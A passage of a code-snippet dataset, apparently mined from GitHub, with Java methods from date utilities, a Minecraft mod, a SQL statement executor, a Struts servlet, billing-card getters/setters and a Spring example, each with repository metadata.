startMinute = Integer.parseInt(startTime.substring(14, 16));\n\n        Date endCurrentTime = new Date(endMilliseconds);\n        String endTime = simpleDateFormat.format(endCurrentTime);\n        int endYear = Integer.parseInt(endTime.substring(0, 4));\n        int endMonth = Integer.parseInt(endTime.substring(5, 7));\n        int endDay = Integer.parseInt(endTime.substring(8, 10));\n        int endHour = Integer.parseInt(endTime.substring(11, 13));\n        int endMinute = Integer.parseInt(endTime.substring(14, 16));*/\n\n        if (endMilliseconds - startMilliseconds >= 24 * 3600 * 1000) {\n            return (((endMilliseconds - startMilliseconds) / (24 * 3600 * 1000))) + UIUtils.getString(R.string.track_day);\n        } else if (endMilliseconds - startMilliseconds >= 3600 * 1000) {\n            return (((endMilliseconds - startMilliseconds) / (3600 * 1000))) + UIUtils.getString(R.string.hour);\n        } else {\n            return (((endMilliseconds - startMilliseconds) / (60 * 1000))) + UIUtils.getString(R.string.minute);\n        }\n    }", "url": "https://raw.githubusercontent.com/Florizt/RxMVVM/master/rxmvvmlib/src/main/java/com/rx/rxmvvmlib/util/TimeUtil.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57170, "method_name": "getSecondsByMilliseconds", "class_name": "TimeUtil", "params": ["long"], "throws": null, "modifiers": ["public", "static"], "return_type": "long", "snippet": "    public static long getSecondsByMilliseconds(long milliseconds) {\n        long seconds = new BigDecimal((float) ((float) milliseconds / (float) 1000)).setScale(0,\n                BigDecimal.ROUND_HALF_UP).intValue();\n        return seconds;\n    }", "url": "https://raw.githubusercontent.com/Florizt/RxMVVM/master/rxmvvmlib/src/main/java/com/rx/rxmvvmlib/util/TimeUtil.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57171, "method_name": "getTodayTimeBucket", "class_name": "TimeUtil", "params": ["Date"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String getTodayTimeBucket(Date currentTime) {\n        SimpleDateFormat timeformatter24 = new SimpleDateFormat(\"HH:mm\", Locale.getDefault());\n        String timeStringBy24 = timeformatter24.format(currentTime);\n        int hour = Integer.parseInt(timeStringBy24.substring(0, 2));\n        if (hour >= 0 && hour < 5) {\n            return LanguageUtil.isZh(UIUtils.getContext()) ? UIUtils.getString(R.string.before_dawn) + \" \" + timeStringBy24 : timeStringBy24 + \" \" + \"AM\";\n        } else if (hour >= 5 && hour < 12) {\n            return LanguageUtil.isZh(UIUtils.getContext()) ? UIUtils.getString(R.string.morning) + \" \" + timeStringBy24 : timeStringBy24 + \" \" + \"AM\";\n        } else if (hour >= 12 && hour < 18) {\n            return LanguageUtil.isZh(UIUtils.getContext()) ? UIUtils.getString(R.string.afternoon) + \" \" + timeStringBy24 : timeStringBy24 + \" \" + \"PM\";\n        } else if (hour >= 18 && hour < 24) {\n            return LanguageUtil.isZh(UIUtils.getContext()) ? UIUtils.getString(R.string.night) + \" \" + timeStringBy24 : timeStringBy24 + \" \" + \"PM\";\n        }\n        return \"\";\n    }", "url": "https://raw.githubusercontent.com/Florizt/RxMVVM/master/rxmvvmlib/src/main/java/com/rx/rxmvvmlib/util/TimeUtil.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57172, "method_name": "isSameWeekDates", "class_name": "TimeUtil", "params": ["Date", "Date"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "    public static boolean isSameWeekDates(Date date1, Date date2) {\n        Calendar cal1 = Calendar.getInstance();\n        Calendar cal2 = Calendar.getInstance();\n        cal1.setTime(date1);\n        cal2.setTime(date2);\n        int subYear = cal1.get(Calendar.YEAR) - cal2.get(Calendar.YEAR);\n        if (0 == subYear) {\n            if (cal1.get(Calendar.WEEK_OF_YEAR) == cal2.get(Calendar.WEEK_OF_YEAR))\n                return true;\n        } else if (1 == subYear && 11 == cal2.get(Calendar.MONTH)) {\n            // \u5982\u679c12\u6708\u7684\u6700\u540e\u4e00\u5468\u6a2a\u8de8\u6765\u5e74\u7b2c\u4e00\u5468\u7684\u8bdd\u5219\u6700\u540e\u4e00\u5468\u5373\u7b97\u505a\u6765\u5e74\u7684\u7b2c\u4e00\u5468\n            if (cal1.get(Calendar.WEEK_OF_YEAR) == cal2.get(Calendar.WEEK_OF_YEAR))\n                return true;\n        } else if (-1 == subYear && 11 == cal1.get(Calendar.MONTH)) {\n            if (cal1.get(Calendar.WEEK_OF_YEAR) == cal2.get(Calendar.WEEK_OF_YEAR))\n                return true;\n        }\n        return false;\n    }", "url": "https://raw.githubusercontent.com/Florizt/RxMVVM/master/rxmvvmlib/src/main/java/com/rx/rxmvvmlib/util/TimeUtil.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57173, "method_name": "isSameYear", "class_name": "TimeUtil", "params": ["Date", "Date"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "    public static boolean isSameYear(Date date1, Date date2) {\n        Calendar cal1 = Calendar.getInstance();\n        Calendar cal2 = Calendar.getInstance();\n        cal1.setTime(date1);\n        cal2.setTime(date2);\n        int subYear = cal1.get(Calendar.YEAR) - cal2.get(Calendar.YEAR);\n        return 0 == subYear;\n    }", "url": "https://raw.githubusercontent.com/Florizt/RxMVVM/master/rxmvvmlib/src/main/java/com/rx/rxmvvmlib/util/TimeUtil.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57174, "method_name": "isSameDay", "class_name": "TimeUtil", "params": ["Date", "Date"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "    public static boolean isSameDay(Date date1, Date date2) {\n        Calendar cal1 = Calendar.getInstance();\n        Calendar cal2 = Calendar.getInstance();\n        cal1.setTime(date1);\n        cal2.setTime(date2);\n        return cal1.get(Calendar.YEAR) == cal2.get(Calendar.YEAR) &&\n                cal1.get(Calendar.DAY_OF_YEAR) == cal2.get(Calendar.DAY_OF_YEAR);\n    }", "url": "https://raw.githubusercontent.com/Florizt/RxMVVM/master/rxmvvmlib/src/main/java/com/rx/rxmvvmlib/util/TimeUtil.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57175, "method_name": "getWeekOfDate", "class_name": "TimeUtil", "params": ["Date"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String getWeekOfDate(Date date) {\n        String[] weekDaysName = {\n                UIUtils.getString(R.string.sunday),\n                UIUtils.getString(R.string.monday),\n                UIUtils.getString(R.string.tuesday),\n                UIUtils.getString(R.string.wednesday),\n                UIUtils.getString(R.string.thursday),\n                UIUtils.getString(R.string.friday),\n                UIUtils.getString(R.string.saturday)};\n        // String[] weekDaysCode = { \"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\" };\n        Calendar calendar = Calendar.getInstance();\n        calendar.setTime(date);\n        int intWeek = calendar.get(Calendar.DAY_OF_WEEK) - 1;\n        return weekDaysName[intWeek];\n    }", "url": "https://raw.githubusercontent.com/Florizt/RxMVVM/master/rxmvvmlib/src/main/java/com/rx/rxmvvmlib/util/TimeUtil.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57176, "method_name": "initElements", "class_name": "JungleTanbarkBlock", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void initElements() {\n\t\telements.blocks.add(() -> new CustomBlock());\n\t\telements.items\n\t\t\t\t.add(() -> new BlockItem(block, new Item.Properties().group(ItemGroup.BUILDING_BLOCKS)).setRegistryName(block.getRegistryName()));\n\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/JungleTanbarkBlock.java", "stars": "2", "class_props": {"extends": "EnhancedVanillaElements", "implements": null, "modifiers": ["public"]}}, {"id": 57177, "method_name": "getDrops", "class_name": "CustomBlock", "params": ["BlockState", "LootContext"], "throws": null, "modifiers": ["public"], "return_type": "List<ItemStack>", "snippet": "\t\tpublic List<ItemStack> getDrops(BlockState state, LootContext.Builder builder) {\n\t\t\tList<ItemStack> dropsOriginal = super.getDrops(state, builder);\n\t\t\tif (!dropsOriginal.isEmpty())\n\t\t\t\treturn dropsOriginal;\n\t\t\treturn Collections.singletonList(new ItemStack(this, 1));\n\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/JungleTanbarkBlock.java", "stars": "2", "class_props": {"extends": "FallingBlock", "implements": null, "modifiers": ["public", "static"]}}, {"id": 57178, "method_name": "setConfiguration", "class_name": "StatementExecutor", "params": ["Configuration"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setConfiguration(Configuration configuration) {\n        this.configuration = configuration;\n    }", "url": "https://raw.githubusercontent.com/javamxd/ssssssss/master/src/main/java/org/ssssssss/executor/StatementExecutor.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57179, "method_name": "execute", "class_name": "StatementExecutor", "params": ["Statement", "RequestContext"], "throws": ["SQLException", "ClassNotFoundException"], "modifiers": ["public"], "return_type": "Object", "snippet": "    public Object execute(Statement statement, RequestContext context) throws SQLException, ClassNotFoundException {\n        if (statement instanceof SqlStatement) {\n            return executeSqlStatement((SqlStatement) statement, context);\n        } else if (statement instanceof FunctionStatement) {\n            return executeFunctionStatement((FunctionStatement) statement, context);\n        }\n        return null;\n    }", "url": "https://raw.githubusercontent.com/javamxd/ssssssss/master/src/main/java/org/ssssssss/executor/StatementExecutor.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57180, "method_name": "executeFunctionStatement", "class_name": "StatementExecutor", "params": ["FunctionStatement", "RequestContext"], "throws": ["ClassNotFoundException", "SQLException"], "modifiers": ["private"], "return_type": "Object", "snippet": "    private Object executeFunctionStatement(FunctionStatement functionStatement, RequestContext context) throws ClassNotFoundException, SQLException {\n        NodeList nodeList = functionStatement.getNodeList();\n        Object value = null;\n        for (int i = 0, len = nodeList.getLength(); i < len; i++) {\n            Node node = nodeList.item(i);\n            if (node.getNodeType() == Node.COMMENT_NODE) {\n                continue;\n            }\n            if (\"java\".equalsIgnoreCase(node.getNodeName())) {\n                // \u89e3\u6790\u7c7b\u540d\u548c\u65b9\u6cd5\u540d\n                String className = DomUtils.getNodeAttributeValue(node, \"class\");\n                Assert.isNotBlank(className, \"class\u4e0d\u80fd\u4e3a\u7a7a\uff01\");\n                String method = DomUtils.getNodeAttributeValue(node, \"method\");\n                Assert.isNotBlank(method, \"method\u4e0d\u80fd\u4e3a\u7a7a\uff01\");\n                // \u89e3\u6790\u53c2\u6570\n                NodeList values = (NodeList) DomUtils.evaluate(\"value\", node, XPathConstants.NODESET);\n                Object[] args = new Object[0];\n                if (values != null) {\n                    // \u53d6\u51fa\u53c2\u6570\u503c\n                    args = new Object[values.getLength()];\n                    for (int j = 0; j < args.length; j++) {\n                        // \u89e3\u6790\u8868\u8fbe\u5f0f\n                        String expression = values.item(j).getTextContent();\n                        if (StringUtils.isNotBlank(expression)) {\n                            args[j] = context.evaluate(expression.trim());\n                        }\n                    }\n                }\n                // \u8c03\u7528java\u65b9\u6cd5\n                value = executeJava(className, method, args);\n            } else if (\"execute-sql\".equalsIgnoreCase(node.getNodeName())) {\n                String sqlId = DomUtils.getNodeAttributeValue(node, \"id\");\n                Statement statement = configuration.getStatementById(sqlId);\n                Assert.isNotNull(statement, String.format(\"\u627e\u4e0d\u5230SQL:%s\", sqlId));\n                // \u89e3\u6790\u53c2\u6570\n                NodeList params = (NodeList) DomUtils.evaluate(\"param\", node, XPathConstants.NODESET);\n                if (params != null) {\n                    for (int j = 0, l = params.getLength(); j < l; j++) {\n                        Node param = params.item(j);\n                        String paramName = DomUtils.getNodeAttributeValue(param, \"name\");\n                        String paramValue = DomUtils.getNodeAttributeValue(param, \"value\");\n                        Assert.isNotBlanks(\"execute-sql/param\u7684\u53c2\u6570\u540d\u548c\u503c\u90fd\u4e0d\u80fd\u4e3a\u7a7a\", paramName, paramValue);\n                        // \u91cd\u65b0\u8986\u76d6\u503c\n                        context.put(paramName, context.evaluate(paramValue));\n                    }\n                }\n                //\u6267\u884cSQL\n                value = executeSqlStatement((SqlStatement) statement, context);\n            } else {\n                logger.warn(\"\u4e0d\u652f\u6301\u8282\u70b9{}\", node.getNodeName());\n                continue;\n            }\n            // \u8bbe\u7f6e\u8fd4\u56de\u503c\u91cd\u7f6e\u5230context\u4e2d\n            String returnVal = DomUtils.getNodeAttributeValue(node, \"return\");\n            if (StringUtils.isNotBlank(returnVal)) {\n                context.put(returnVal, value);\n            }\n        }\n        return value;\n    }", "url": "https://raw.githubusercontent.com/javamxd/ssssssss/master/src/main/java/org/ssssssss/executor/StatementExecutor.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57181, "method_name": "executeJava", "class_name": "StatementExecutor", "params": ["String", "String", "Object"], "throws": ["ClassNotFoundException"], "modifiers": ["private"], "return_type": "Object", "snippet": "    private Object executeJava(String className, String methodName, Object... args) throws ClassNotFoundException {\n        Class<?> clazz = Class.forName(className);\n        Object target = null;\n        AbstractReflection reflection = AbstractReflection.getInstance();\n        Method method = (Method) reflection.getMethod(clazz, methodName, args);\n        Assert.isTrue(method != null, String.format(\"\u5728%s\u4e2d\u627e\u4e0d\u5230\u65b9\u6cd5%s\", className, methodName));\n        try {\n            target = applicationContext.getBean(clazz);\n        } catch (BeansException ignored) {\n            Assert.isTrue(Modifier.isStatic(method.getModifiers()), String.format(\"%s\u4e0d\u5728spring\u5bb9\u5668\u4e2d\u65f6%s\u5fc5\u987b\u662f\u9759\u6001\u65b9\u6cd5\", className, methodName));\n        }\n        return reflection.callMethod(target, method, args);\n    }", "url": "https://raw.githubusercontent.com/javamxd/ssssssss/master/src/main/java/org/ssssssss/executor/StatementExecutor.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57182, "method_name": "executeSqlStatement", "class_name": "StatementExecutor", "params": ["SqlStatement", "RequestContext"], "throws": ["SQLException"], "modifiers": ["private"], "return_type": "Object", "snippet": "    private Object executeSqlStatement(SqlStatement sqlStatement, RequestContext context) throws SQLException {\n        if (sqlStatement.isPagination()) {  //\u5224\u65ad\u662f\u5426\u662f\u5206\u9875\u8bed\u53e5\n            // \u83b7\u53d6\u8981\u6267\u884c\u7684SQL\n            String sql = sqlStatement.getSqlNode().getSql(context).trim();\n            // \u4eceRequest\u4e2d\u63d0\u53d6Page\u5bf9\u8c61\n            Page page = pageProvider.getPage(context.getRequest());\n            // \u83b7\u53d6\u6570\u636e\u5e93\u65b9\u8a00\n            Dialect dialect = sqlExecutor.getDialect(sqlStatement.getDataSourceName());\n            PageResult<Object> pageResult = new PageResult<>();\n            // \u83b7\u53d6\u603b\u6761\u6570\n            long total = (long) sqlExecutor.execute(sqlStatement.getDataSourceName(), SqlMode.SELECT_ONE, dialect.getCountSql(sql), context.getParameters().toArray(), Long.class);\n            pageResult.setTotal(total);\n            // \u5f53\u6761\u6570>0\u65f6\uff0c\u6267\u884c\u67e5\u8be2\u8bed\u53e5\uff0c\u5426\u5219\u4e0d\u67e5\u8be2\u4ee5\u63d0\u9ad8\u6027\u80fd\n            if (total > 0) {\n                // \u83b7\u53d6\u5206\u9875\u8bed\u53e5\n                String pageSql = dialect.getPageSql(sql, context, page.getOffset(), page.getLimit());\n                // \u6267\u884c\u67e5\u8be2\n                pageResult.setList((List) sqlExecutor.execute(sqlStatement.getDataSourceName(), SqlMode.SELECT_LIST, pageSql, context.getParameters().toArray(), sqlStatement.getReturnType()));\n            }\n            return pageResult;\n        } else if (SqlMode.INSERT_WITH_PK == sqlStatement.getSqlMode()) {   //\u63d2\u5165\u8fd4\u56de\u4e3b\u952e\n            return sqlExecutor.executeInsertWithPk(sqlStatement, context);\n        } else {\n            // \u83b7\u53d6\u8981\u6267\u884c\u7684SQL\n            String sql = sqlStatement.getSqlNode().getSql(context).trim();\n            // \u666e\u901aSQL\u6267\u884c\n            return sqlExecutor.execute(sqlStatement.getDataSourceName(), sqlStatement.getSqlMode(), sql, context.getParameters().toArray(), sqlStatement.getReturnType());\n        }\n    }", "url": "https://raw.githubusercontent.com/javamxd/ssssssss/master/src/main/java/org/ssssssss/executor/StatementExecutor.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57183, "method_name": "init", "class_name": "ActionServlet", "params": [], "throws": ["ServletException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void init()\n        throws ServletException\n    {\n\t\tfinal String configPrefix = \"struts-config\";\n\t\t\n\t    StringBuilder paths = new StringBuilder();\n\t\t\n\t    File webInf = new File( \"webapps/WEB-INF\" );\n\t\tfor( File file : webInf.listFiles() )\n\t\t{\n\t\t\tString fileName = file.getName();\n\t\t\t\n\t\t\tif( !fileName.startsWith( configPrefix ) )\n\t\t\t{\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\t\n\t\t\tif( paths.length() > 0 )\n\t\t\t{\n\t\t\t\tpaths.append( \",\" );\n\t\t\t}\n\t\t\t\n\t\t\tpaths.append( \"/WEB-INF/\" + fileName );\n\t\t}\n\t\t\n\t\tthis.config = paths.toString();\n\t    \n\t\tsuper.init();\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/servlet/ActionServlet.java", "stars": "12", "class_props": {"extends": "org", "implements": null, "modifiers": ["public"]}}, {"id": 57184, "method_name": "getBasecardId", "class_name": "UserCard", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getBasecardId() {\n        return basecardId;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/ws/cerbercrypt/usercard/copy/UserCard.java", "stars": "12", "class_props": {"extends": "Id", "implements": null, "modifiers": ["public"]}}, {"id": 57185, "method_name": "setBasecardId", "class_name": "UserCard", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setBasecardId(int value) {\n        this.basecardId = value;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/ws/cerbercrypt/usercard/copy/UserCard.java", "stars": "12", "class_props": {"extends": "Id", "implements": null, "modifiers": ["public"]}}, {"id": 57186, "method_name": "getBasecardTitle", "class_name": "UserCard", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getBasecardTitle() {\n        return basecardTitle;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/ws/cerbercrypt/usercard/copy/UserCard.java", "stars": "12", "class_props": {"extends": "Id", "implements": null, "modifiers": ["public"]}}, {"id": 57187, "method_name": "setBasecardTitle", "class_name": "UserCard", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setBasecardTitle(String value) {\n        this.basecardTitle = value;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/ws/cerbercrypt/usercard/copy/UserCard.java", "stars": "12", "class_props": {"extends": "Id", "implements": null, "modifiers": ["public"]}}, {"id": 57188, "method_name": "getComment", "class_name": "UserCard", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getComment() {\n        return comment;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/ws/cerbercrypt/usercard/copy/UserCard.java", "stars": "12", "class_props": {"extends": "Id", "implements": null, "modifiers": ["public"]}}, {"id": 57189, "method_name": "setComment", "class_name": "UserCard", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setComment(String value) {\n        this.comment = value;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/ws/cerbercrypt/usercard/copy/UserCard.java", "stars": "12", "class_props": {"extends": "Id", "implements": null, "modifiers": ["public"]}}, {"id": 57190, "method_name": "getContractId", "class_name": "UserCard", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getContractId() {\n        return contractId;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/ws/cerbercrypt/usercard/copy/UserCard.java", "stars": "12", "class_props": {"extends": "Id", "implements": null, "modifiers": ["public"]}}, {"id": 57191, "method_name": "setContractId", "class_name": "UserCard", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setContractId(int value) {\n        this.contractId = value;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/ws/cerbercrypt/usercard/copy/UserCard.java", "stars": "12", "class_props": {"extends": "Id", "implements": null, "modifiers": ["public"]}}, {"id": 57192, "method_name": "getDate1", "class_name": "UserCard", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getDate1() {\n        return date1;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/ws/cerbercrypt/usercard/copy/UserCard.java", "stars": "12", "class_props": {"extends": "Id", "implements": null, "modifiers": ["public"]}}, {"id": 57193, "method_name": "setDate1", "class_name": "UserCard", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setDate1(String value) {\n        this.date1 = value;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/ws/cerbercrypt/usercard/copy/UserCard.java", "stars": "12", "class_props": {"extends": "Id", "implements": null, "modifiers": ["public"]}}, {"id": 57194, "method_name": "getDate2", "class_name": "UserCard", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getDate2() {\n        return date2;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/ws/cerbercrypt/usercard/copy/UserCard.java", "stars": "12", "class_props": {"extends": "Id", "implements": null, "modifiers": ["public"]}}, {"id": 57195, "method_name": "setDate2", "class_name": "UserCard", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setDate2(String value) {\n        this.date2 = value;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/ws/cerbercrypt/usercard/copy/UserCard.java", "stars": "12", "class_props": {"extends": "Id", "implements": null, "modifiers": ["public"]}}, {"id": 57196, "method_name": "isNeedSync", "class_name": "UserCard", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isNeedSync() {\n        return needSync;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/ws/cerbercrypt/usercard/copy/UserCard.java", "stars": "12", "class_props": {"extends": "Id", "implements": null, "modifiers": ["public"]}}, {"id": 57197, "method_name": "setNeedSync", "class_name": "UserCard", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setNeedSync(boolean value) {\n        this.needSync = value;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/ws/cerbercrypt/usercard/copy/UserCard.java", "stars": "12", "class_props": {"extends": "Id", "implements": null, "modifiers": ["public"]}}, {"id": 57198, "method_name": "getNumber", "class_name": "UserCard", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long getNumber() {\n        return number;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/ws/cerbercrypt/usercard/copy/UserCard.java", "stars": "12", "class_props": {"extends": "Id", "implements": null, "modifiers": ["public"]}}, {"id": 57199, "method_name": "setNumber", "class_name": "UserCard", "params": ["long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setNumber(long value) {\n        this.number = value;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/ws/cerbercrypt/usercard/copy/UserCard.java", "stars": "12", "class_props": {"extends": "Id", "implements": null, "modifiers": ["public"]}}, {"id": 57200, "method_name": "getObjectId", "class_name": "UserCard", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getObjectId() {\n        return objectId;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/ws/cerbercrypt/usercard/copy/UserCard.java", "stars": "12", "class_props": {"extends": "Id", "implements": null, "modifiers": ["public"]}}, {"id": 57201, "method_name": "setObjectId", "class_name": "UserCard", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setObjectId(int value) {\n        this.objectId = value;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/ws/cerbercrypt/usercard/copy/UserCard.java", "stars": "12", "class_props": {"extends": "Id", "implements": null, "modifiers": ["public"]}}, {"id": 57202, "method_name": "getSlavecardsNumber", "class_name": "UserCard", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getSlavecardsNumber() {\n        return slavecardsNumber;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/ws/cerbercrypt/usercard/copy/UserCard.java", "stars": "12", "class_props": {"extends": "Id", "implements": null, "modifiers": ["public"]}}, {"id": 57203, "method_name": "setSlavecardsNumber", "class_name": "UserCard", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setSlavecardsNumber(int value) {\n        this.slavecardsNumber = value;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/ws/cerbercrypt/usercard/copy/UserCard.java", "stars": "12", "class_props": {"extends": "Id", "implements": null, "modifiers": ["public"]}}, {"id": 57204, "method_name": "getSubscrDate", "class_name": "UserCard", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Date", "snippet": "    public Date getSubscrDate() {\n        return subscrDate;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/ws/cerbercrypt/usercard/copy/UserCard.java", "stars": "12", "class_props": {"extends": "Id", "implements": null, "modifiers": ["public"]}}, {"id": 57205, "method_name": "setSubscrDate", "class_name": "UserCard", "params": ["Date"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setSubscrDate(Date value) {\n        this.subscrDate = value;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/ws/cerbercrypt/usercard/copy/UserCard.java", "stars": "12", "class_props": {"extends": "Id", "implements": null, "modifiers": ["public"]}}, {"id": 57206, "method_name": "getUserdeviceId", "class_name": "UserCard", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getUserdeviceId() {\n        return userdeviceId;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/ws/cerbercrypt/usercard/copy/UserCard.java", "stars": "12", "class_props": {"extends": "Id", "implements": null, "modifiers": ["public"]}}, {"id": 57207, "method_name": "setUserdeviceId", "class_name": "UserCard", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setUserdeviceId(int value) {\n        this.userdeviceId = value;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/ws/cerbercrypt/usercard/copy/UserCard.java", "stars": "12", "class_props": {"extends": "Id", "implements": null, "modifiers": ["public"]}}, {"id": 57208, "method_name": "getHandler", "class_name": "WebContainer", "params": [], "throws": null, "modifiers": ["public", "abstract"], "return_type": "RequestHandler", "snippet": "\tpublic abstract RequestHandler getHandler();\n\t\n\tpublic void  processRequest(String data) {\n\t\n\t\tRequestHandler rh=null; \n\t\tSystem.out.println(\"WebContainer recived request having data::  \"+data +\"   for processing-->\"+this.hashCode());\n\t\t  //get Depedent Bean class object\n\t\trh=getHandler();\n\t\t//use Dependent Bean\n\t\t  \t\trh.handle(data);\n\t\t\n\t}", "url": "https://raw.githubusercontent.com/nataraz123/Spring/master/IOCProj62-LMI-FinalSolution/src/main/java/com/nt/beans/WebContainer.java", "stars": "8", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 57209, "method_name": "processRequest", "class_name": "WebContainer", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void  processRequest(String data) {\n\t\n\t\tRequestHandler rh=null; \n\t\tSystem.out.println(\"WebContainer recived request having data::  \"+data +\"   for processing-->\"+this.hashCode());\n\t\t  //get Depedent Bean class object\n\t\trh=getHandler();\n\t\t//use Dependent Bean\n\t\t  \t\trh.handle(data);\n\t\t\n\t}", "url": "https://raw.githubusercontent.com/nataraz123/Spring/master/IOCProj62-LMI-FinalSolution/src/main/java/com/nt/beans/WebContainer.java", "stars": "8", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 57210, "method_name": "create", "class_name": "ViewHolderItemCategorySmall", "params": ["ViewGroup", "Context", "Fragment", "RecyclerView"], "throws": null, "modifiers": ["public", "static"], "return_type": "ViewHolderItemCategorySmall", "snippet": "    public static ViewHolderItemCategorySmall create(ViewGroup parent, Context context, Fragment fragment,\n                                                     RecyclerView.Adapter adapter)\n    {\n\n        View view = 